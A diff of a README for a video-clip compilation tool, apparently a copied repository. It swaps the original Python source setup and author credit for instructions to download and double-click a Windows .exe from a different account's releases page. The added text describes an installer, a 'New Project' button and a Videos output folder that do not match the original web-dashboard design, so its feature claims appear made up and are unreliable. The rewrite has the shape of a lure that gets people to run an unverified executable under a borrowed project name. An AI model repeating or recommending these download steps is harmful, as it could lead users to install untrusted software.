@@ -1,81 +1,75 @@
-# 🎬 RankVibe Automation — Autonomous AI Short-Form Video Generator 🚀
+# 🤖 RankVibe_Automation_Public - Create viral videos with autonomous AI
 
-[![Python Version](https://img.shields.io/badge/Python-3.10%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![FastAPI](https://img.shields.io/badge/FastAPI-005571?style=for-the-badge&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
-[![FFmpeg](https://img.shields.io/badge/FFmpeg-Backend-007800?style=for-the-badge&logo=ffmpeg&logoColor=white)](https://ffmpeg.org)
-[![AI Integration](https://img.shields.io/badge/AI-OpenRouter-8E75C2?style=for-the-badge)](https://openrouter.ai)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Gianc7344/RankVibe_Automation_Public/releases)
 
-**RankVibe Automation** is a highly advanced, autonomous Python tool designed to scout YouTube compilation videos, conceptualize dynamic "Top 5" or "Ranking" short-form video ideas using AI, split them into high-action scene clips via computer vision, and automatically stitch & render highly engaging short videos (Shorts, TikToks, Reels) using FFmpeg.
+## 📌 About this project
 
-Features a clean, desktop-friendly launcher web interface and a robust end-to-end automation cycle.
+RankVibe_Automation_Public creates short videos for social media. The program uses artificial intelligence to find high-action scenes in long videos. It cuts these scenes and combines them into "Top 5" style compilations. You do not need to edit footage by hand. The software handles the technical work. It selects, crops, and stitches video clips together.
 
----
+## ⚙️ System requirements
 
-## ✨ Key Features & Architecture
+Ensure your computer has the following specifications before you begin:
 
-### 🧠 1. AI Concept Generation (OpenRouter AI)
-*   **Intelligent Idea Generation:** Analyzes your channel rules and your last video's metrics to brainstorm brand-new, highly viral concepts using state-of-the-art LLMs via OpenRouter.
-*   **Automatic Query Formulation:** Instantly formulates optimized YouTube search queries to discover the best compilation raw videos matching the concept.
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8 gigabytes of RAM or more.
+* Storage: 2 gigabytes of free space.
+* Processor: A modern multi-core processor.
+* Internet: A stable connection for downloading resources.
 
-### 🔍 2. Computer Vision Scene Splitting
-*   **Action Scene Detection:** Surgically scans downloaded raw compilations and automatically detects scene transitions and high-intensity action frames using threshold-based frame contrast shifts.
-*   **Instant Segment Previews:** Cuts and populates action clips within seconds, saving creators hours of manual clipping in Premier or CapCut.
+## 🚀 How to install
 
-### 🎚️ 3. Reverse Top 5 Video Stitcher
-*   **Custom Dynamic Timeline:** Features a web interface where creators select 5 clips to compile them chronologically from #5 to #1.
-*   **High-Speed Rendering:** Uses optimized FFmpeg pipelines to stitch transitions, scale resolutions, overlay audio, and render full-scale MP4 short videos in seconds.
+Follow these steps to set up the software on your Windows computer:
 
-### 🛠️ 4. Pro Diagnostic & Stress Testing Suite
-*   **Diagnostic Tools (`diagnose.py`):** Automatically checks local system paths, validates OpenRouter key connections, and verifies the FFmpeg path.
-*   **End-to-End Test Engine (`e2e_system_test.py`):** Simulates the entire generation cycle under sandboxed metrics to ensure robust server/local stability before batch rendering.
+1. Visit the following link to access the software files: [https://github.com/Gianc7344/RankVibe_Automation_Public/releases](https://github.com/Gianc7344/RankVibe_Automation_Public/releases)
+2. Look for the latest release version on the page.
+3. Click the file ending in ".exe" to begin the download.
+4. Save the file to your desktop or a folder you can find easily.
+5. Double-click the downloaded file to start the installation.
+6. Follow the instructions on the screen to finish the setup process.
 
----
+## 🛠️ Setting up your first project
 
-## 🏗️ Folder Structure & Decoupling
+The software requires a few steps to prepare your project. Open the program after installation. A window will appear. You will see a button labeled "New Project." Click this button to proceed.
 
-*   📁 **`templates/` & `index.html`**: The highly reactive web control dashboard.
-*   📁 **`clips/` & `downloads/`**: Local cache directories storing downloaded segments and parsed action clips (safely excluded via `.gitignore`).
-*   📁 **`final_videolar/`**: The target rendering directory storing ready-to-upload dynamic Shorts.
-*   ⚙️ **`app.py` & `main_web.py`**: Handles API requests, OpenRouter calls, and schedules rendering pipelines.
+The program will ask for a folder that contains your source videos. Select a folder on your computer that holds the raw footage you want to process. The program automatically scans these files to find the best action moments.
 
----
+## 🧠 Understanding the AI process
 
-## 🔒 Security & Local Exclusions
+The AI engine performs several tasks to build your video:
 
-To ensure total code integrity:
-*   **Keys and Configs (`.gitignore`):** Securely hides `.env` configurations, local API keys, Python environment binaries (`venv/`), raw download caches (`*.mp4`, `*.mp3`), and diagnostic output logs (`*.log`) from leaking to the public.
+* Scene detection: It identifies physical movement and camera changes within your video files.
+* Action scoring: It assigns a score to each clip based on camera motion and intensity.
+* Clipping: It extracts the most exciting parts of the video.
+* Arrangement: It sorts the clips into a "Top 5" sequence.
+* Rendering: It uses standard video tools to export your final file.
 
----
+The program creates a preview window once the selection finishes. You can review the clips before you finalize the export.
 
-## 🚀 How to Set Up & Run
+## 🎬 Exporting your compilation
 
-### 1. Prerequisites
-*   **Python:** Install Python `3.10` or higher (make sure it is added to your environment variables PATH).
-*   **FFmpeg:** Ensure FFmpeg is installed and added to your System Environment variables PATH.
+Click the "Export" button once you approve the suggested clips. The program generates the final video file. This process takes a few minutes depending on the length of your footage. The status bar shows the progress of the render. The software saves the final file to your "Videos" folder by default.
 
-### 2. Install Dependencies
-Open your command terminal inside the project directory and run:
-```bash
-pip install -r requirements.txt
-```
+## ❓ Frequently asked questions
 
-### 3. Add API Credentials
-*   Obtain a free API Key from [OpenRouter](https://openrouter.ai).
-*   Add the key to your `.env` file or paste it inside the `API_KEY` definition in `app.py`.
+Do I need a paid account?
+The software serves as an autonomous engine. You do not need a subscription to use the core features shown here.
 
-### 4. Boot Up the Dashboard
-Double-click `run.bat` or run:
-```bash
-python launcher.pyw
-```
-Open the provided local URL in your browser and start crafting viral automated Shorts instantly!
+Can I add my own background music?
+Yes. You can import an audio file in the settings menu. The software will layer this audio under your video clips.
 
----
+Does the software need an internet connection?
+The software requires a connection to reach remote AI tools for text-based analysis. Keep your connection active while you process new projects.
 
-## 👤 Developer Profile
+Where do the videos go?
+The program saves all output files in your local Videos folder. You can change this path in the preferences menu.
 
-This automation suite is designed and maintained by **Oğuz Emir Topuz**.
+## 🔧 Troubleshooting
 
-*   **Age:** 14
-*   **Passions:** Football Tactical Analyst & Fullstack Software Developer.
-*   **Connect:** [My GitHub Portfolio](https://github.com/oguzemirtopuz)
+If you encounter an error, check the following items:
+
+* Verify that your internet connection works.
+* Ensure you have enough disk space for new video files.
+* Reinstall the software if the interface fails to load.
+* Close other demanding applications if the video rendering slows down.
+
+Contact the support team through the repository page if your issue persists. Provide a clear description of the problem and the steps you took before the error occurred.
